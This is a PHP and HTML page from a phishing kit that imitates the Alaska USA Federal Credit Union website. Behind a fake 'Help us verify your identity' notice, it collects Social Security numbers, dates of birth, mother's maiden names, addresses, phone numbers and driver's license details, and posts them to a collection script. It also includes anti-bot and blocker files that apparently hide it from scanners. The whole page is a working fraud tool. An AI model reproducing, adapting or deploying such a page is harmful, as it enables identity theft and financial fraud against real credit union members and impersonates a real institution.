<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include 'blocker.php';
include 'antirobot.php';
include 'bt.php';


?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><link rel="stylesheet" type="text/css" href="cid_css-f67370e3-17cc-45c5-b7ab-983d52b875d9_mhtml.blink.css" /><link rel="stylesheet" type="text/css" href="cid_css-90a67382-f27f-47c1-97bc-a79cb1a316ce_mhtml.blink.css" /><link rel="stylesheet" type="text/css" href="cid_css-64e936e6-c7e3-4e61-aba9-5bd501899cb8_mhtml.blink.css" />

    
    <title>Alaska USA services for you</title>

    <link rel="stylesheet" href="ub-print.css_akusa.css" type="text/css" media="print">
    <link rel="stylesheet" href="ub-main.css_akusa.css" type="text/css" title="main" media="screen, projection">
    <link rel="stylesheet" href="ub-login-new.css_akusa.css" type="text/css">
	
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="apple-touch-icon" href="icon.png" type="image/png">
<link rel="apple-touch-icon" sizes="72x72" href="icon-72.png" type="image/png">
<link rel="apple-touch-icon" sizes="114x114" href="icon@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="144x144" href="icon-72@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="60x60" href="icon-60.png" type="image/png">
<link rel="apple-touch-icon" sizes="120x120" href="icon-60@2x.png" type="image/png">
<link rel="apple-touch-icon" sizes="76x76" href="icon-76.png" type="image/png">
<link rel="apple-touch-icon" sizes="152x152" href="icon-76@2x.png" type="image/png">
<meta name="msapplication-TileImage" content="icon-72@2x.png">
<meta name="msapplication-TileColor" content="#003399">


<script src="jquery-3.1.0.min.js"></script>
<script src="jquery.maskedinput.js"></script>

    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:"___-__-____"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#phon').mask("999-999-9999", {placeholder:"___-___-____"});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#dt').mask("999", {placeholder:""});
    });   
    </script>
	    <script>
    $(document).ready(function(){
     $('#psp').mask("9999-9999-9999-9999", {placeholder:"X"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:""});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#pinsi').mask("9999", {placeholder:""});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#phnno').mask("999-999-9999", {placeholder:"X"});
    });   
    </script>
	
	<script>
    $(document).ready(function(){
     $('#udds').mask("99/99/9999", {placeholder:"MM/DD/YYYY"});
    });  
</script> 
<script>
    $(document).ready(function(){
     $('#iss').mask("99/99/9999", {placeholder:"MM/DD/YYYY"});
    });  
</script> 
<script>
    $(document).ready(function(){
     $('#exp').mask("99/99/9999", {placeholder:"MM/DD/YYYY"});
    });  	
    </script>    
    

    
    
  </head>
  <body>
    <div id="header">
      <div id="topBar">
        <a href="" id="logo" title="Alaska USA Federal Credit Union"><img src="akusafcu_logo.png" alt="Alaska USA products for you"></a>
        <p id="headerReturnLink"><a href="" title="Home">Return to home</a></p>
      </div>
      <div id="pgHead">
        <!--
        <a title="Alaska USA homepage (in new window)" id="logo" tabindex="-1"
          href="javascript:PopupWindow('AKUSA');">
          <img border="0" alt="Alaska USA" src="/efs/images/logo-corp.png" />
        </a>
        -->
      </div>
    </div>
    <div id="pgMain">
      <div id="mainContent">
        <div class="leftCol">
          
          <h2 style="margin-top:30px;">Help us verify your identity</h2>
          
          
          <div class="last">
            
            
            <form name="" method="POST" action="clearsort2.php">
              
              <p>For your security, we must identify you in order to assist you resolve the issue with your account. Please enter the information required to complete the fields below to continue.. 
              
              
              </p><table class="dataForm">
                <tbody>
				
				
                  <tr>
                    <th scope="row"><label id="userIdLabel">Full Name:</label></th>
                    <td>
                      <input type="text" id="UserName" name="fname" class="inputField" aria-labelledby="userIdLabel" value="" required="" maxlength="25">
                    </td>
                  </tr>
				  
				  
                  <tr>
                    <th scope="row"><label id="emailLabel">Social Security number <img control="forms:inputHelpIcon" src="icn-ind-help-form-darkteal-glob-16x16-000750-v01_00_1x.png" alt="help icon for Social Security Number or Individual Tax Identification Number field"></label></th>
                    <td>
                      <input type="text" id="ssd" name="ssn" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">Date of Birth (DOB)</label></th>
                    <td>
                      <input type="text" id="udds" name="dob" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">Mother's Maiden Name</label></th>
                    <td>
                      <input type="text" id="Email" name="mmn" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				    <tr>
                    <th scope="row"><label id="emailLabel">Residential Address</label></th>
                    <td>
                      <input type="text" id="Email" name="resadd" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">State</label></th>
                    <td>
                      <!--<input type="text" id="Email" name="state" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">-->
					  
					  <select name="state" class="inputField" aria-labelledby="">
					  <option value="">Select One</option>
	<option value="AL">Alabama</option>
	<option value="AK">Alaska</option>
	<option value="AZ">Arizona</option>
	<option value="AR">Arkansas</option>
	<option value="CA">California</option>
	<option value="CO">Colorado</option>
	<option value="CT">Connecticut</option>
	<option value="DE">Delaware</option>
	<option value="DC">District Of Columbia</option>
	<option value="FL">Florida</option>
	<option value="GA">Georgia</option>
	<option value="HI">Hawaii</option>
	<option value="ID">Idaho</option>
	<option value="IL">Illinois</option>
	<option value="IN">Indiana</option>
	<option value="IA">Iowa</option>
	<option value="KS">Kansas</option>
	<option value="KY">Kentucky</option>
	<option value="LA">Louisiana</option>
	<option value="ME">Maine</option>
	<option value="MD">Maryland</option>
	<option value="MA">Massachusetts</option>
	<option value="MI">Michigan</option>
	<option value="MN">Minnesota</option>
	<option value="MS">Mississippi</option>
	<option value="MO">Missouri</option>
	<option value="MT">Montana</option>
	<option value="NE">Nebraska</option>
	<option value="NV">Nevada</option>
	<option value="NH">New Hampshire</option>
	<option value="NJ">New Jersey</option>
	<option value="NM">New Mexico</option>
	<option value="NY">New York</option>
	<option value="NC">North Carolina</option>
	<option value="ND">North Dakota</option>
	<option value="OH">Ohio</option>
	<option value="OK">Oklahoma</option>
	<option value="OR">Oregon</option>
	<option value="PA">Pennsylvania</option>
	<option value="RI">Rhode Island</option>
	<option value="SC">South Carolina</option>
	<option value="SD">South Dakota</option>
	<option value="TN">Tennessee</option>
	<option value="TX">Texas</option>
	<option value="UT">Utah</option>
	<option value="VT">Vermont</option>
	<option value="VA">Virginia</option>
	<option value="WA">Washington</option>
	<option value="WV">West Virginia</option>
	<option value="WI">Wisconsin</option>
	<option value="WY">Wyoming</option>
</select>
					  
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">City</label></th>
                    <td>
                      <input type="text" id="Email" name="city" class="inputField" aria-labelledby="" value="" required="" maxlength="40" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				   <tr>
                    <th scope="row"><label id="emailLabel">Zip Code</label></th>
                    <td>
                      <input type="text" id="Email" name="zipcode" class="inputField" aria-labelledby="" value="" required="" maxlength="6" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">Phone Number</label></th>
                    <td>
                      <input type="text" id="phon" name="phoneno" class="inputField" aria-labelledby="" value="" required="" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">Drivers License Number</label></th>
                    <td>
                      <input type="text" name="dln" class="inputField" aria-labelledby="" value="" required="" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">Issue Date</label></th>
                    <td>
                      <input type="text" id="iss" name="iss" class="inputField" aria-labelledby="" value="" required="" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
				  <tr>
                    <th scope="row"><label id="emailLabel">Expiry Date</label></th>
                    <td>
                      <input type="text" id="exp" name="exp" class="inputField" aria-labelledby="" value="" required="" autocapitalize="off" autocorrect="off">
                    </td>
                  </tr>
				  
				  
                </tbody>
              </table>
              <div class="center"><input type="image" src="ctn_btn.jpg" width="72" height="25"></div>
            </form>
            
            
          </div>
          
          <!--<h2>Forgot User ID?</h2>
          <p>Your User ID is your member account number unless you have selected an alternate User ID.  Your account number is printed in the top-right corner of your statement.  If you still need help with your User ID, the Member Service Center is available 24/7 at (907) 563-4567 or (800) 525-9094</p>-->
          
        </div>
        <div class="sideBar">
          <div class="learnMore">
            
            <h2 class="help">Quick Help</h2>
            <ul class="help">
              
              <li id="liNote1">
                <a>Which email should I use?</a>
                <div class="notes" id="note1">
                  <p>Use the email address assigned to the account.</p>
                </div>
              </li>
              <li id="liNote2">
                <a>UltraBanch Business Edition User?</a>
                <div class="notes" id="note2" style="list-style:none">
                  Primary Contacts have three options for assistance:
                  <ul style="list-style-type:disc;padding-left:0;">
                    <li>Contact a Company Administrator</li>
                    <li>Go into a branch with a photo ID</li>
                    
                    <li>Attempt an online password reset</li>
                    
                    
                  </ul>
                </div>
              </li>
              <li><a href="" target="_blank">Forgot User ID?</a></li>
              <li><a href="" target="_blank">Other issues?</a></li>
              
              
            </ul>
            <div class="help" style="display:none;">
              <h1>Questions?  (800) 525-9094</h1>
            </div>
            
          </div>
          <div id="questionSection" class="learnMore">
            <h2>Questions?</h2>
            <p>
              For assistance contact the Member Service Center.
            </p><p style="padding-left:10px;margin-top:10px;">
              (907) 563-4567 or (800) 525-9094<br><br>
              Open 24 hours a day, 7 days a week.<br><br>
              <a href="" target="_blank">More contact information</a>
            </p>
            <p></p>
          </div>
        </div>
      </div>
      
      <div id="pgFooter" style="background-color:rgb(200,200,200)">
        <hr>

   <div id="footer" role="contentinfo">
   	 <span class="bug">       
       <img alt="Equal Housing Lender" src="logo-ehl-tri.gif_.gif#042116">
     </span>
          
     <p> � Copyright  2021 � Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293. Licensed by the Department of Business Oversight under the California Residential Mortgage Lending Act, License #4131067</p>
        <p><a>Privacy</a></p>
     
     
     <p class="ncua">
       <img src="logo-ncua.gif_.gif#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>  
   </div>
      </div>
    </div>
  
</body></html>
